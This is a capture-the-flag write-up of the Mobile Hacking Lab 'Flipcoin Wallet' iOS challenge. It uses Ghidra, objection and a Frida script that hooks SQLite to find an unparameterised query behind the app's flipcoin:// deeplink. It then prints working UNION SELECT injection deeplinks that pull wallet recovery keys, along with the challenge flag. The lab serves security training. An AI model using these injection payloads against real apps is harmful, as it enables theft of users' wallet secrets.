---
title: Flipcoin Wallet - Mobile Hacking Lab
date: 2025-5-10 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, ios]     # TAG names should always be lowercase

---



<br />

**Introduction**

Welcome to the **iOS Application Security Lab: SQL Injection Challenge**. The challenge is centered around a fictious crypto currency flipcoin and its wallet Flipcoin Wallet. The Flipcoin wallet is an offline wallet giving users full ownership of their digital assets. The challenge highlights the potential entrypoints that can lead to further serious vulnerabilities including SQL injection. As an attacker, your aim is to craft an exploit that can be used to attack other users of the application.

<br />

**Objective**

Craft a payload to gain access to the local database: Your task is to find your way to the locally stored SQL database and craft an exploit that can access the recovery keys of another user's wallet.



<br />

#### Explore The App

When the app launches, your balance is displayed along with two buttons for sending and receiving crypto. Below these are additional buttons that lead to other screens: *Quick Buy*, *Crypto News*, and *Transactions*.

<br />

![](/assets/img/mhl/FlipcoinWallet/1.jpg)



<br /><br />

The Quick Buy screen lets you select the currency and specify the amount you wish to purchase.

<br />



![](/assets/img/mhl/FlipcoinWallet/2.jpg)

<br /><br />

The Crypto News screen shows the latest news related to cryptocurrencies.

<br />



![](/assets/img/mhl/FlipcoinWallet/3.jpg)

<br />

The news is fetched from this URL: `https://mhl.pages.dev/flipcoin-news`, and the response includes deep links, for example: `flipcoin://buy?currency=BTC`.

<br />

![](/assets/img/mhl/FlipcoinWallet/2.png)



<br /><br />

When you click the ‘Receive’ button, a QR code is displayed. I scanned the QR code, and its value is: `http://flipcoin//0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=1`.

<br />

![](/assets/img/mhl/FlipcoinWallet/4.jpg)

<br />

When you click the ‘Send’ button, a new screen opens with a form where you can enter the recipient’s address and the amount you wish to send. The screen also shows your current balance and your wallet address.

<br />



![](/assets/img/mhl/FlipcoinWallet/5.jpg)



<br /><br />

When I navigate to the deeplink `flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=1`, a screen opens displaying the message: "You do not have enough Flipcoins to complete the transaction!"

<br />

![](/assets/img/mhl/FlipcoinWallet/6.jpg)



<br />

However, when I used the deeplink `flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.001`, the Send screen opened with the recipient address set to `0x252B2Fff0d264d946n1004E581bb0a46175DC009` and the amount pre-filled as `0.001`.

<br />

![](/assets/img/mhl/FlipcoinWallet/13.jpg)



<br /><br />

#### Static Analysis

<br />



**Extracting the `.ipa` File**

The provided app came in an `.ipa` file essentially a ZIP archive containing the application bundle.

```
unzip com.mobilehackinglab.Flipcoin-Wallet6.ipa
```

Inside the extracted folder, the binary was located in:

```
Payload/Flipcoin Wallet.app/Flipcoin Wallet
```

<br />

The content of Info.plist file

```json
└─# ipsw plist Info.plist                             
{
  "BuildMachineOSBuild": "23D60",
  "CFBundleDevelopmentRegion": "en",
  "CFBundleExecutable": "Flipcoin Wallet",
  "CFBundleIcons": {
    "CFBundlePrimaryIcon": {
      "CFBundleIconFiles": [
        "AppIcon60x60"
      ],
      "CFBundleIconName": "AppIcon"
    }
  },
  "CFBundleIcons~ipad": {
    "CFBundlePrimaryIcon": {
      "CFBundleIconFiles": [
        "AppIcon60x60",
        "AppIcon76x76"
      ],
      "CFBundleIconName": "AppIcon"
    }
  },
  "CFBundleIdentifier": "com.mobilehackinglab.Flipcoin-Wallet6",
  "CFBundleInfoDictionaryVersion": "6.0",
  "CFBundleName": "Flipcoin Wallet",
  "CFBundlePackageType": "APPL",
  "CFBundleShortVersionString": "1.0",
  "CFBundleSupportedPlatforms": [
    "iPhoneOS"
  ],
  "CFBundleURLTypes": [
    {
      "CFBundleTypeRole": "Editor",
      "CFBundleURLName": "com.mobilehackinglab.flipcoinwallet",
      "CFBundleURLSchemes": [
        "flipcoin"
      ]
    }
  ],

```

**custom URL scheme** for the app. Specifically:

- **`CFBundleURLTypes`**: This key contains an array of URL type dictionaries that declare the app’s supported URL schemes.
- **`CFBundleTypeRole`**: Indicates the app’s role for handling this type of URL. Here, it is set to `"Editor"`, which is a descriptive role used by the system.
- **`CFBundleURLName`**: Provides a unique identifier for the URL type, in this case `"com.mobilehackinglab.flipcoinwallet"`.
- **`CFBundleURLSchemes`**: Lists the custom URL schemes that the app can handle. For this app, it is `"flipcoin"`.

With this configuration, the app can be launched from other apps or the system by opening a URL that starts with the scheme `flipcoin://`. This allows the app to handle deeplinks, enabling navigation to specific screens or passing parameters such as transaction details.

<br /><br />



**Reverse Engineering with Ghidra**

“After analyzing the app binary with Ghidra, I discovered the string `your_database_name.sqlite`, which is likely the database the app uses to store wallet addresses and balances.

![](/assets/img/mhl/FlipcoinWallet/3.png)





<br /><br />

**Dynamic Analysis**

```
└─# objection -g com.mobilehackinglab.Flipcoin-Wallet6.J8L462KYQ8 explore 
Checking for a newer version of objection...
Using USB device `iOS Device`
Agent injected and responds ok!

     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___| |___|___|_| |_|___|_|_|
      |___|(object)inject(ion) v1.11.0

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions
...ab.Flipcoin-Wallet6.J8L462KYQ8 on (iPhone: 16.0) [usb] # env

Name               Path
-----------------  ---------------------------------------------------------------------------------------------------
BundlePath         /private/var/containers/Bundle/Application/28875D39-C213-4F3C-82A4-3BB098B18A19/Flipcoin Wallet.app
CachesDirectory    /var/mobile/Containers/Data/Application/4CD30E6E-1788-4079-ADE7-1DCBED95870B/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/4CD30E6E-1788-4079-ADE7-1DCBED95870B/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/4CD30E6E-1788-4079-ADE7-1DCBED95870B/Library
```

<br />

I located the file `your_database_name.sqlite` at `/var/mobile/Containers/Data/Application/UUID/Documents/your_database_name.sqlite`.

```
iPhone:/var/mobile/Containers/Data/Application/4CD30E6E-1788-4079-ADE7-1DCBED95870B/Documents root# ls
your_database_name.sqlite
```

<br />

You can pull the `your_database_name.sqlite` file from the device and open it with a tool like `sqlitebrowser` to examine the database tables and review the entries stored in the wallet database.

```
└─# scp root@192.168.1.6:"/var/mobile/Containers/Data/Application/4CD30E6E-1788-4079-ADE7-1DCBED95870B/Documents/your_database_name.sqlite" your_database_name.sqlite
```

<br />

```
sqlitebrowser your_database_name.sqlite
```

<br />

![](/assets/img/mhl/FlipcoinWallet/1.png)

<br />



This Frida script hooks `sqlite3_prepare`, `sqlite3_prepare_v2`, `sqlite3_prepare_v3`, `sqlite3_prepare16`, `sqlite3_prepare16_v2`, and `sqlite3_prepare16_v3` to capture and inspect the SQLite queries executed by the app.

```javascript
// frida-sqlite-prepare-all.js
// Hooks sqlite3_prepare, sqlite3_prepare_v2, sqlite3_prepare_v3,
// sqlite3_prepare16, sqlite3_prepare16_v2, sqlite3_prepare16_v3
// plus helpful surrounding SQLite functions to make output useful.
//
// Usage:
//   frida -U -f <bundle/id> -l frida-sqlite-prepare-all.js --no-pause
// or attach:
//   frida -U -n <process> -l frida-sqlite-prepare-all.js

'use strict';

const stmts = {}; // map stmtPtr -> { sql: "...", binds: { idx: val } }

function p(ptr) { return ptr ? ptr.toString() : "0x0"; }

function safeReadUtf8(ptr) {
    try {
        if (!ptr || ptr.isNull()) return null;
        return Memory.readUtf8String(ptr);
    } catch (e) {
        return null;
    }
}

function safeReadUtf16(ptr) {
    try {
        if (!ptr || ptr.isNull()) return null;
        return Memory.readUtf16String(ptr);
    } catch (e) {
        return null;
    }
}

function backtrace(context) {
    try {
        return Thread.backtrace(context, Backtracer.ACCURATE)
            .map(DebugSymbol.fromAddress)
            .slice(0, 12)
            .join("\n");
    } catch (e) {
        return "(backtrace unavailable)";
    }
}

// utility to store SQL for a statement
function storeStmt(stmtPtr, sql) {
    try {
        const key = p(stmtPtr);
        if (!stmts[key]) stmts[key] = { sql: sql, binds: {} };
    } catch (e) {}
}

// Handler generator for prepare variants
function attachPrepare(symName, opts) {
    // opts: { sqlArgIndex: int, isUtf16: bool, ppStmtIndex: int }
    const ptr = Module.findExportByName(null, symName);
    if (!ptr) {
        // console.log(symName + " not found");
        return;
    }
    Interceptor.attach(ptr, {
        onEnter: function (args) {
            this.sym = symName;
            this.isUtf16 = !!opts.isUtf16;
            this.sqlArg = args[opts.sqlArgIndex];
            this.ppStmt = args[opts.ppStmtIndex];
            this.bt = backtrace(this.context);
            if (this.isUtf16) {
                this.sql = safeReadUtf16(this.sqlArg) || null;
            } else {
                this.sql = safeReadUtf8(this.sqlArg) || null;
            }
        },
        onLeave: function (retval) {
            try {
                const sql = this.sql || "(null)";
                if (!this.ppStmt.isNull()) {
                    const stmtPtr = Memory.readPointer(this.ppStmt);
                    if (!stmtPtr.isNull()) {
                        storeStmt(stmtPtr, sql);
                        console.log("\n== " + this.sym + " ==");
                        console.log("STMT: " + p(stmtPtr));
                        console.log("SQL: " + sql);
                        console.log("Return code: " + retval.toInt32());

                        return;
                    }
                }
                // sometimes prepare variants do not return a stmt (NULL) but still worth logging
                console.log("\n== " + this.sym + " (no stmt) ==");
                console.log("SQL: " + sql);
                console.log("Return code: " + retval.toInt32());

            } catch (e) {
                console.log(this.sym + ".onLeave error: " + e);
            }
        }
    });
}

// Attach all prepare functions you requested
const prepares = [
    { name: "sqlite3_prepare",             opts: { sqlArgIndex: 1, isUtf16: false, ppStmtIndex: 3 } },
    { name: "sqlite3_prepare_v2",          opts: { sqlArgIndex: 1, isUtf16: false, ppStmtIndex: 3 } },
    { name: "sqlite3_prepare_v3",          opts: { sqlArgIndex: 1, isUtf16: false, ppStmtIndex: 3 } },

    // 16-bit (UTF-16) variants usually have wchar_t* as sql arg
    { name: "sqlite3_prepare16",           opts: { sqlArgIndex: 1, isUtf16: true,  ppStmtIndex: 3 } },
    { name: "sqlite3_prepare16_v2",        opts: { sqlArgIndex: 1, isUtf16: true,  ppStmtIndex: 3 } },
    { name: "sqlite3_prepare16_v3",        opts: { sqlArgIndex: 1, isUtf16: true,  ppStmtIndex: 3 } }
];

prepares.forEach(function(pf) {
    attachPrepare(pf.name, pf.opts);
});

// Also hook sqlite3_exec (convenient for statements executed directly via exec)
const execPtr = Module.findExportByName(null, "sqlite3_exec");
if (execPtr) {
    Interceptor.attach(execPtr, {
        onEnter: function(args) {
            this.db = args[0];
            this.sqlPtr = args[1];
            // try utf8 then utf16 fallback
            this.sql = safeReadUtf8(this.sqlPtr) || safeReadUtf16(this.sqlPtr) || null;
            this.bt = backtrace(this.context);
            console.log("\n== sqlite3_exec ==");
            console.log("DB: " + p(this.db));
            console.log("SQL: " + (this.sql || "(null)"));

        }
    });
}

// sqlite3_step: print bound params and associated SQL if we tracked it
const stepPtr = Module.findExportByName(null, "sqlite3_step");
if (stepPtr) {
    Interceptor.attach(stepPtr, {
        onEnter: function(args) {
            try {
                this.stmt = args[0];
                const key = p(this.stmt);
                const rec = stmts[key];
                if (rec) {
                    this.bt = backtrace(this.context);
                    console.log("\n== sqlite3_step ==");
                    console.log("STMT: " + key);
                    console.log("SQL: " + rec.sql);
                    if (rec.binds && Object.keys(rec.binds).length > 0) {
                        console.log("Bound params:");
                        for (let i in rec.binds) console.log("  [" + i + "] = " + rec.binds[i]);
                    } else {
                        console.log("Bound params: (none)");
                    }

                }
            } catch (e) {}
        }
    });
}

// Bind functions: record values for tracked statements
const bindFns = [
    { name: "sqlite3_bind_text",    handler: function(args){
            const stmt = args[0]; const idx = args[1].toInt32(); const txt = safeReadUtf8(args[2]) || safeReadUtf16(args[2]) || null;
            const key = p(stmt);
            if (stmts[key]) stmts[key].binds[idx] = txt === null ? "NULL" : '"' + txt + '"';
        }
    },
    { name: "sqlite3_bind_text16",  handler: function(args){
            const stmt = args[0]; const idx = args[1].toInt32(); const txt = safeReadUtf16(args[2]) || null;
            const key = p(stmt);
            if (stmts[key]) stmts[key].binds[idx] = txt === null ? "NULL" : '"' + txt + '"';
        }
    },
    { name: "sqlite3_bind_int",     handler: function(args){
            const stmt = args[0]; const idx = args[1].toInt32(); const v = args[2].toInt32();
            const key = p(stmt);
            if (stmts[key]) stmts[key].binds[idx] = v;
        }
    },
    { name: "sqlite3_bind_int64",   handler: function(args){
            const stmt = args[0]; const idx = args[1].toInt32(); const v = args[2].toInt64();
            const key = p(stmt);
            if (stmts[key]) stmts[key].binds[idx] = v.toString();
        }
    },
    { name: "sqlite3_bind_double",  handler: function(args){
            const stmt = args[0]; const idx = args[1].toInt32();
            // read double safely
            let v = null;
            try { v = args[2].readDouble(); } catch (e) {
                try { v = args[2].toDouble(); } catch (e2) { v = "(double?)"; }
            }
            const key = p(stmt);
            if (stmts[key]) stmts[key].binds[idx] = v;
        }
    },
    { name: "sqlite3_bind_null",    handler: function(args){
            const stmt = args[0]; const idx = args[1].toInt32();
            const key = p(stmt);
            if (stmts[key]) stmts[key].binds[idx] = "NULL";
        }
    },
    { name: "sqlite3_bind_blob",    handler: function(args){
            const stmt = args[0]; const idx = args[1].toInt32(); const n = args[3].toInt32();
            const key = p(stmt);
            if (stmts[key]) stmts[key].binds[idx] = "<blob, " + n + " bytes>";
        }
    }
];

bindFns.forEach(function(item) {
    const ptr = Module.findExportByName(null, item.name);
    if (!ptr) return;
    Interceptor.attach(ptr, {
        onEnter: function(args) {
            try { item.handler(args); } catch (e) {}
        }
    });
});

// finalize: print final bound params and cleanup
const finalizePtr = Module.findExportByName(null, "sqlite3_finalize");
if (finalizePtr) {
    Interceptor.attach(finalizePtr, {
        onEnter: function(args) {
            try {
                const stmt = args[0];
                const key = p(stmt);
                const rec = stmts[key];
                if (rec) {
                    console.log("\n== sqlite3_finalize ==");
                    console.log("STMT: " + key);
                    console.log("SQL: " + rec.sql);
                    if (rec.binds && Object.keys(rec.binds).length > 0) {
                        console.log("Bound params (final):");
                        for (let i in rec.binds) console.log("  [" + i + "] = " + rec.binds[i]);
                    } else {
                        console.log("Bound params: (none)");
                    }
                    delete stmts[key];
                }
            } catch (e) {}
        }
    });
}

// reset: clear binds (statements may be reused)
const resetPtr = Module.findExportByName(null, "sqlite3_reset");
if (resetPtr) {
    Interceptor.attach(resetPtr, {
        onEnter: function(args) {
            try {
                const key = p(args[0]);
                if (stmts[key]) stmts[key].binds = {};
            } catch (e) {}
        }
    });
}

// defensive log to show script loaded
console.log("[frida] sqlite3 prepare hooks installed for: sqlite3_prepare, sqlite3_prepare_v2, sqlite3_prepare_v3, sqlite3_prepare16, sqlite3_prepare16_v2, sqlite3_prepare16_v3 (plus exec/step/bind/finalize/reset).");
```

The output of the Frida script when navigating to the Send screen through normal app interaction shows the SQL queries executed by the app, including the prepared statements, bound parameters, and associated database operations.

```sql
└─# frida -U -f com.mobilehackinglab.Flipcoin-Wallet6.J8L462KYQ8 -l hook.js
     ____
    / _  |   Frida 16.0.0 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to iOS Device (id=4a6e3de083155aae4c1a3473ff2d8c76b254887b)
Spawning `com.mobilehackinglab.Flipcoin-Wallet6.J8L462KYQ8`...          
[frida] sqlite3 prepare hooks installed for: sqlite3_prepare, sqlite3_prepare_v2, sqlite3_prepare_v3, sqlite3_prepare16, sqlite3_prepare16_v2, sqlite3_prepare16_v3 (plus exec/step/bind/finalize/reset).
Spawned `com.mobilehackinglab.Flipcoin-Wallet6.J8L462KYQ8`. Resuming main thread!
[iOS Device::com.mobilehackinglab.Flipcoin-Wallet6.J8L462KYQ8 ]->
== sqlite3_exec ==
DB: 0x104d097b0
SQL:     CREATE TABLE IF NOT EXISTS wallet (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        address TEXT,
        currency FLOAT,
        amount FLOAT,
        recovery_key TEXT
    );

== sqlite3_exec ==
DB: 0x104d097b0
SQL: SELECT*FROM"main".sqlite_master ORDER BY rowid

== sqlite3_prepare ==
STMT: 0x1126c4340
SQL: INSERT OR IGNORE INTO wallet
(
    id,
    address,
    currency,
    amount,
    recovery_key
) VALUES
(1, "0x252B2Fff0d264d946n1004E581bb0a46175DC009", "flipcoin", 0.3654, "FLAG{fl1p_d4_c01nz}}"),
(2, "1W5vKAAKmBAjjtpCkGZREjgEGjrbwERND", "bitcoin", 15.26, "BATTLE TOADS WRITING POEMS");
Return code: 0

== sqlite3_step ==
STMT: 0x1126c4340
SQL: INSERT OR IGNORE INTO wallet
(
    id,
    address,
    currency,
    amount,
    recovery_key
) VALUES
(1, "0x252B2Fff0d264d946n1004E581bb0a46175DC009", "flipcoin", 0.3654, "FLAG{fl1p_d4_c01nz}}"),
(2, "1W5vKAAKmBAjjtpCkGZREjgEGjrbwERND", "bitcoin", 15.26, "BATTLE TOADS WRITING POEMS");
Bound params: (none)

== sqlite3_prepare ==
STMT: 0x1126c47f0
SQL: SELECT * FROM wallet LIMIT 1;
Return code: 0

== sqlite3_step ==
STMT: 0x1126c47f0
SQL: SELECT * FROM wallet LIMIT 1;
Bound params: (none)
```

<br />



When I opened the deeplink `flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001`, the Frida script output was as follows:

```sql
== sqlite3_prepare ==
STMT: 0x109e887f0
SQL: SELECT * FROM wallet WHERE amount >0.0001 AND currency='flipcoin' LIMIT 1;
Return code: 0
```

**The SQL query executed is:**

```sql
SELECT * FROM wallet WHERE amount > 0.0001 AND currency = 'flipcoin' LIMIT 1;
```

**Notice:** 

- Our input `0.0001` is injected directly into the SQL statement without any filtering or use of parameterized queries, which could allow for SQL injection via the `amount` field.”
- To open the deeplink correctly, first launch the app and navigate to the ‘Quick Buy’ screen before opening the deeplink. Do not open the deeplink directly from the home screen.

<br />

Since the `wallet` table contains five columns and the app’s original SQL query uses `SELECT *` to retrieve all columns, any `UNION` injection must also include five columns. For example:

```
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001 UNION SELECT '1', '2', '3', '4', '5';-- -
```

To open the deeplink correctly, replace spaces with `%20` for URL encoding.

```
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001%20UNION%20SELECT%20'1',%20'2',%20'3',%20'4',%20'5';--%20-
```

<br />

After injecting the payload, the executed SQL query becomes:

```sqlite
SELECT * FROM wallet 
WHERE amount > 0.0001  
UNION SELECT '1', '2', '3', '4', '5';-- - 
AND currency = 'flipcoin' 
LIMIT 1;
```



<br /><br />

![](/assets/img/mhl/FlipcoinWallet/8.jpg)

<br /><br />

**Using the deeplink**

```
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001 UNION SELECT 'aaa', 'bbb', 'ccc', 'ddd', 'eee';-- -

flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001%20UNION%20SELECT%20'aaa',%20'bbb',%20'ccc',%20'ddd',%20'eee';--%20-
```

**notice that the value `'bbb'` is reflected in the app instead of the original wallet address.** This indicates that the injected values from the `UNION SELECT` statement are being returned and rendered in place of the original data.

<br />

![](/assets/img/mhl/FlipcoinWallet/9.jpg)

<br /><br />

**To retrieve the flag, open the following deeplink:**

```
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001 UNION SELECT 'aaa', recovery_key, 'ccc', 'ddd', 'eee' FROM wallet;-- -

flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001%20UNION%20SELECT%20'aaa',%20recovery_key,%20'ccc',%20'ddd',%20'eee'%20FROM%20wallet;--%20-
```

This payload uses a `UNION SELECT` to inject the `recovery_key` value from the `wallet` table, allowing it to be displayed in the app.

**Flag:** FLAG{fl1p_d4_c01nz}

<br /><br />

![](/assets/img/mhl/FlipcoinWallet/11.jpg)

<br /><br />

**To retrieve the recovery key, open the following deeplink:**

```
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001 UNION SELECT 'aaa', recovery_key, 'ccc', 'ddd', 'eee' FROM wallet LIMIT 1,2;-- -

flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001%20UNION%20SELECT%20'aaa',%20recovery_key,%20'ccc',%20'ddd',%20'eee'%20FROM%20wallet%20LIMIT%201,2;--%20-
```

This payload uses a `UNION SELECT` statement with a `LIMIT` clause to extract the recovery key from the `wallet` table and display it in the app.

Recovery Key: BATTLE TOADS WRITING POEMS

<br /><br />

![](/assets/img/mhl/FlipcoinWallet/10.jpg)